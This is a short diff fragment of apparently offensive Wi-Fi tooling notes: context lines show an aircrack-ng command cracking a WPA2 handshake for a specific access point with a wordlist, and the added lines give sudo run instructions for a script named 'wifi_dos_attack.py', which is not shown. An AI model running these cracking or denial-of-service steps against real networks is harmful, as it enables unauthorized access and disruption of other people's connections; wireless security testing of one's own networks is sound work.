@@ -44,3 +44,19 @@ aircrack-ng -a2 -b A8:32:9A:00:66:E8 -w /media/root/CAF04BE4F04BD57B/test/word.t
 #Stop Monitor Mode
 airmon-ng stop wlan0mon
 service network-manager restart
+
+
+---
+## 📝 Instructions
+
+1. Save the script as `wifi_dos_attack.py`.
+
+2. Run it with `sudo`:
+
+   ```bash
+   sudo python3 wifi_dos_attack.py
+
+3. Make sure the aircrack-ng suite is installed:
+   sudo apt install aircrack-ng
+
+
